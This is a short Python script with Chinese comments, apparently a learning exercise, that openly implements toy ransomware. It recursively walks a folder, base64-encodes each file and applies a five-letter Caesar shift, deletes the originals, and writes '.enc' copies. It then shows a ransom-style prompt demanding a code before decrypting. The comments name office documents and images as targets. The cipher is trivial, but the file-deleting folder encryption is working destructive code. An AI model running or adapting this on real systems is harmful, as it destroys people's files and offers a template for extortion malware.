# -*- coding: utf-8 -*-
"""
文 件 名: base64_example.py
文件描述: 
作    者: HanKin
创建日期: 2023.12.13
修改日期：2023.12.13

Copyright (c) 2023 HanKin. All rights reserved.
"""
import base64, os
# 对一个文件进行勒索，怎么对文件夹进行勒索
# 联系：对某些目录下关键文件：word xls docx ppt pptx rar jpg png txt
import base64,os
# 对指定文件进行加密
def ransom_enypt(filepath):
    # filepath = input("请输入文件路径：")
    with open(filepath, 'rb') as file:
        data = file.read()
    source = base64.b64encode(data).decode()
    # 对字符串加密 右移5位
    result = ''
    for i in source:
        if ord(i) in range(97, 123) or ord(i) in range(65, 91):  # 判断i是小写或者大写字母，统一右移五位
            result += chr(ord(i)+5)
        else:
            result += i
    os.remove(filepath)  # 删除源文件
    with open(filepath+'.enc', 'w') as file:  # 加上后缀重新写入文件
        file.write(result)
# ransom_enypt()
# 对指定文件进行解密
def ransom_deypt(filepath):
    with open(filepath, 'r') as file:
        data = file.read()
    result = ''
    for i in data:
        if ord(i) in range(102, 128) or ord(i) in range(70, 96):  # 解密 向左减5
            result += chr(ord(i) - 5)
        else:
            result += i
 
    result = base64.b64decode(result)
    os.remove(filepath)
    with open(filepath.replace('.enc', ''), 'wb') as file:
        file.write(result)
 
# 对文件夹进行加密或解密
def dir_crypt(dirpath,type='encode'):
    dirs = os.listdir(dirpath)
    for filename in dirs:
        filename = os.path.join(dirpath, filename)
        # 判断是目录还是文件
        if os.path.isdir(filename):
            dir_crypt(filename, type)
        # 如果是文件，根据type的值进行加减密
        else:
            if type == 'encode':
                ransom_enypt(filename)
            elif type == 'decode':
                ransom_deypt(filename)
            else:
                raise Exception("type error")
if __name__ == '__main__':
    # ransom_enypt('./name/1.png')
    # print("文件已加密，解密请扣666")
    # num = int(input("请输入："))
    # if num == 666:
    #     ransom_deypt('./name/1.png.enc')
    #     print("解锁成功~")
    # else:
    #     print("不扣不解")
 
    # 加解密文件夹
    dir_crypt('./ceshi')
    print("文件夹被锁了，解密请扣999")
    num = int(input("请输入："))
    if num == 999:
        dir_crypt('./ceshi', type='decode')
        print("解锁成功~")
    else:
        print("不扣不解")